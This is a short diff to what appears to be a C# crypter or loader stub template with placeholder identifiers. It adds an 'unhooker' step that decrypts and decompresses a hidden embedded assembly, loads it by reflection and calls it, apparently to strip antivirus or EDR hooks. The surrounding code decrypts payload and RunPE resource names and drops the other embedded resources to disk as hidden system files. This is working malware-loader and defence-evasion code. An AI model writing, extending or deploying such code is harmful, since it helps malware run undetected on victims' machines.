@@ -80,11 +80,16 @@ namespace namespace_name
 
             string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadtxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             string runpestr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpedlltxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            string unhookerstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookertxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
 
+            Assembly unhookerasm = Assembly.Load(uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(unhookerstr), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
+            string unhookerclass = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerclass_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            string unhookerfunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerfunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            unhookerasm.GetType(unhookerclass).GetMethod(unhookerfunction).Invoke(null, null);
             Assembly asm = Assembly.GetExecutingAssembly();
             foreach (string name in asm.GetManifestResourceNames())
             {
-                if (name == payloadstr || name == runpestr) continue;
+                if (name == payloadstr || name == runpestr || name == unhookerstr ) continue;
                 File.WriteAllBytes(name, getembeddedresourcefunction_name(name));
                 File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                 new Thread(() =>
